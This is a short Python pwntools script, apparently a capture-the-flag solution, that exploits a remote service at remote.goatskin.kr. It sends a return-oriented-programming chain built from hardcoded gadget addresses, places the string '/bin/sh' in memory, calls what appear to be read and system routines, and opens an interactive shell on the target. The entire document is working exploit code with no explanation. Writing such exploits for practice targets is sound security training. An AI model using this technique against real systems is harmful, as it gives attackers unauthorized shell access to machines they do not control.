from pwn import *

p = remote("remote.goatskin.kr",34123)
context.log_level = "debug"
payload = "AAAA"
payload2 = p64(0x68732f6e6962)

for i in range(4) :
    payload += p64(0x4008b4)

payload += p64(0x4008b1)
payload += p64(0x601090)
payload += p64(0)
payload += p64(0x400610)
payload += p64(0x4008b3)
payload += p64(0x601090)
payload += p64(0x40076d)
payload += "AAAAAAAA"
p.send(payload)
p.send(payload2)
p.interactive()
